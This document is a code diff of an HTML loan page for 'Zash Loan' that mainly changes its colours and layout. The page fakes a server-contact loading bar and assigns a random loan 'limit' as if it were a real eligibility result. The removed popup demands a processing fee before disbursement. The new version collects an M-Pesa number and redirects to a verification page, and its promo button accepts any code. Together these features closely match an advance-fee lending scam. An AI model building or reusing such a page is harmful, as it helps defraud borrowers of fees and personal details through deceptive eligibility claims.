@@ -3,103 +3,105 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Loan Limit - Zash Loan</title>
+  <title>Zash Loan Limit</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gradient-to-tr from-green-900 via-green-700 to-gray-200 min-h-screen text-green-900">
+<body class="bg-gradient-to-tr from-blue-900 via-blue-700 to-gray-200 min-h-screen text-blue-900">
 
   <!-- Loading Screen -->
-  <div id="loadingScreen" class="fixed inset-0 bg-green-950 text-white flex flex-col items-center justify-center z-50">
+  <div id="loadingScreen" class="fixed inset-0 bg-blue-950 text-white flex flex-col items-center justify-center z-50">
     <h1 class="text-lg font-semibold mb-4">Please wait...</h1>
-    <p class="text-sm mb-4">Zash Loan – Contacting servers</p>
-    <div class="w-64 bg-green-200 h-3 rounded-full overflow-hidden mb-2">
-      <div id="progressBar" class="bg-green-500 h-3 w-0 transition-all duration-300"></div>
+    <p class="text-sm mb-4">Contacting servers</p>
+    <div class="w-64 bg-blue-200 h-3 rounded-full overflow-hidden mb-2">
+      <div id="progressBar" class="bg-blue-500 h-3 w-0 transition-all duration-300"></div>
     </div>
     <p id="progressText" class="text-sm font-mono">0%</p>
   </div>
 
-  <!-- Loan Limit Main Container -->
-  <div id="mainContent" class="hidden flex items-center justify-center min-h-screen p-4">
-    <div class="bg-white/90 backdrop-blur-md max-w-sm w-full rounded-2xl shadow-2xl p-6 text-center">
-      <img src="zash-logo.png" alt="Logo" class="w-16 h-16 mx-auto mb-4 rounded-full shadow" />
+  <!-- Main Loan Container -->
+  <div id="mainContent" class="hidden min-h-screen p-4">
+    <div class="max-w-sm mx-auto bg-white/90 backdrop-blur-md rounded-2xl shadow-2xl p-6">
+      <div class="flex items-center justify-between mb-4">
+        <img src="zash-logo.png" alt="Zash Logo" class="w-10 h-10" />
+        <h2 class="text-lg font-bold">Loan Limit Check</h2>
+      </div>
 
-      <h2 class="text-xl font-bold mb-2">Loan Limit Check</h2>
-      <p class="text-sm text-gray-700 mb-4">Your eligible loan limit is ready. Adjust your amount below.</p>
+      <p class="text-sm text-gray-700 mb-4">Adjust your loan amount below.</p>
 
       <div class="mb-4">
         <label class="block text-left font-medium text-sm mb-1">
           Loan Amount (Max: <span id="maxLimitText">...</span>)
         </label>
         <input type="range" min="2500" max="7000" step="100" value="3000" id="loanSlider"
-               class="w-full accent-green-700" oninput="updateSlider(this.value)">
+               class="w-full accent-blue-700" oninput="updateSlider(this.value)">
         <div class="text-sm mt-1">Ksh <span id="loanAmountDisplay">...</span></div>
       </div>
 
-      <div class="text-left text-sm mt-4 bg-green-50 p-3 rounded-xl border border-green-200">
-        <p><strong>Service Fee (6.2%):</strong> Ksh <span id="processingFeeDisplay">...</span></p>
-        <p class="text-gray-600 text-xs mt-1">Charged once before loan disbursement.</p>
+      <div class="bg-blue-50 text-left text-sm p-3 rounded-xl border border-blue-200 mb-4">
+        <p><strong>Interest (10%):</strong> Ksh <span id="interestDisplay">...</span></p>
+        <p><strong>Service Fee (6.2%):</strong> Ksh <span id="serviceFeeDisplay">...</span></p>
+        <p><strong>Total Owed:</strong> Ksh <span id="totalOwedDisplay">...</span></p>
       </div>
 
-      <button onclick="saveAndShowPopup()"
-              class="w-full bg-green-700 hover:bg-green-800 text-white font-semibold py-3 rounded-xl shadow-md transition mt-6">
+      <button onclick="saveLoanData()"
+              class="w-full bg-blue-700 hover:bg-blue-800 text-white font-semibold py-3 rounded-xl shadow-md transition mb-4">
         Apply Now
       </button>
-    </div>
-  </div>
 
-  <!-- Confirmation Popup -->
-  <div id="popupOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
-    <div class="bg-white text-green-900 rounded-2xl p-6 w-11/12 max-w-sm text-center shadow-xl relative">
-      <button onclick="closePopup()" class="absolute top-2 right-3 text-green-700 font-bold text-xl">&times;</button>
-      <h2 class="text-xl font-bold mb-2">Congratulations!</h2>
-      <p class="text-sm mb-4">
-        Hi, <span id="popupUser">User</span><br>
-        Your loan of <strong>Ksh <span id="popupLoan">...</span></strong> is ready.<br>
-        Service Fee: <strong>Ksh <span id="popupFee">...</span></strong><br>
-        Repayment period: <strong>14 days</strong>
-      </p>
-      <p class="text-xs text-gray-600 mb-4">
-        To proceed, kindly pay the one-time processing fee to your <strong>Zash Loan</strong> account. This ensures smooth disbursement and support.<br><br>
-        The fee is deducted from your first repayment.
-      </p>
-      <button onclick="window.location.href='verification.html'"
-              class="bg-green-700 hover:bg-green-800 text-white py-2 px-6 rounded-xl shadow-md transition">
-        Proceed to Payment
-      </button>
+      <div class="mb-4 flex gap-2">
+        <input id="promoCode" type="text" placeholder="Promo Code"
+               class="flex-1 p-2 border border-gray-300 rounded-lg text-sm" />
+        <button onclick="applyPromo()" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg text-sm">
+          Apply
+        </button>
+      </div>
+
+      <div class="space-y-2">
+        <input id="mpesaNumber" type="tel" placeholder="Transfer to Mpesa (Phone Number)"
+               class="w-full p-2 border border-gray-300 rounded-lg text-sm" required />
+        <input id="dueDate" type="date" placeholder="Due Date"
+               class="w-full p-2 border border-gray-300 rounded-lg text-sm" required />
+      </div>
     </div>
   </div>
 
   <script>
     let maxLoan = Math.floor(Math.random() * (7000 - 2500 + 1)) + 2500;
     let currentLoan = maxLoan;
-    let processingFee = Math.floor(currentLoan * 0.062); // 6.2%
-
-    const fullName = localStorage.getItem("fullName") || "User";
 
     function updateSlider(value) {
       currentLoan = parseInt(value);
-      processingFee = Math.floor(currentLoan * 0.062);
+      const interest = Math.floor(currentLoan * 0.10);
+      const serviceFee = Math.floor(currentLoan * 0.062);
+      const totalOwed = currentLoan + interest + serviceFee;
+
       document.getElementById("loanAmountDisplay").textContent = currentLoan.toLocaleString();
-      document.getElementById("processingFeeDisplay").textContent = processingFee.toLocaleString();
+      document.getElementById("interestDisplay").textContent = interest.toLocaleString();
+      document.getElementById("serviceFeeDisplay").textContent = serviceFee.toLocaleString();
+      document.getElementById("totalOwedDisplay").textContent = totalOwed.toLocaleString();
     }
 
-    function saveAndShowPopup() {
+    function saveLoanData() {
+      const interest = Math.floor(currentLoan * 0.10);
+      const serviceFee = Math.floor(currentLoan * 0.062);
+      const totalOwed = currentLoan + interest + serviceFee;
+
       localStorage.setItem("loanAmount", currentLoan);
-      localStorage.setItem("processingFee", processingFee);
-      localStorage.setItem("fullName", fullName);
+      localStorage.setItem("interest", interest);
+      localStorage.setItem("serviceFee", serviceFee);
+      localStorage.setItem("totalOwed", totalOwed);
+      localStorage.setItem("mpesaNumber", document.getElementById("mpesaNumber").value);
+      localStorage.setItem("dueDate", document.getElementById("dueDate").value);
+      localStorage.setItem("promoCode", document.getElementById("promoCode").value);
 
-      document.getElementById("popupUser").textContent = fullName;
-      document.getElementById("popupLoan").textContent = currentLoan.toLocaleString();
-      document.getElementById("popupFee").textContent = processingFee.toLocaleString();
-
-      document.getElementById("popupOverlay").classList.remove("hidden");
+      window.location.href = "verification.html";
     }
 
-    function closePopup() {
-      document.getElementById("popupOverlay").classList.add("hidden");
+    function applyPromo() {
+      alert("Promo code applied (if valid).");
     }
 
-    // Loading simulation
+    // Simulated loading
     let progress = 0;
     const progressText = document.getElementById("progressText");
     const progressBar = document.getElementById("progressBar");
@@ -119,11 +121,9 @@
         document.getElementById("maxLimitText").textContent = maxLoan.toLocaleString();
         document.getElementById("loanSlider").max = maxLoan;
         document.getElementById("loanSlider").value = maxLoan;
-        document.getElementById("loanAmountDisplay").textContent = maxLoan.toLocaleString();
-        document.getElementById("processingFeeDisplay").textContent = processingFee.toLocaleString();
+        updateSlider(maxLoan);
       }
     }, 25);
   </script>
-
 </body>
 </html>
